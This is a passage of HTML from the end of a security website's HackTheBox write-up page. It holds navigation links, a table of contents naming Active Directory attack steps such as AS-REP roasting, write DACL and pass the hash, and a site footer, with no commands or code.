class="pagination-nav__link pagination-nav__link--prev" href="/writeups/HackTheBox/charon"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Charon</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/writeups/HackTheBox/hospital"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Hospital</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#enumeration" class="table-of-contents__link toc-highlight">Enumeration</a></li><li><a href="#shell-as-svc-alfresco" class="table-of-contents__link toc-highlight">shell as svc-alfresco</a><ul><li><a href="#aspreproast" class="table-of-contents__link toc-highlight">aspreproast</a></li><li><a href="#access-through-evil-winrm" class="table-of-contents__link toc-highlight">access through evil-winrm</a></li></ul></li><li><a href="#shell-as-administrator" class="table-of-contents__link toc-highlight">shell as administrator</a><ul><li><a href="#finding-paths-to-domain-admin" class="table-of-contents__link toc-highlight">finding paths to domain admin</a></li><li><a href="#write-dacl-attack" class="table-of-contents__link toc-highlight">write dacl attack</a></li><li><a href="#pass-the-hash" class="table-of-contents__link toc-highlight">pass the hash</a></li></ul></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Documentation</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/defensive-security">Defensive Security</a></li><li class="footer__item"><a class="footer__link-item" href="/offensive-security">Offensive Security</a></li><li class="footer__item"><a class="footer__link-item" href="/writeups">Writeups</a></li><li class="footer__item"><a class="footer__link-item" href="/tutorials">Tutorials</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">More</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/research">Research &amp; Dev</a></li><li class="footer__item"><a href="https://github.com/xffsec" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 xffsec. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>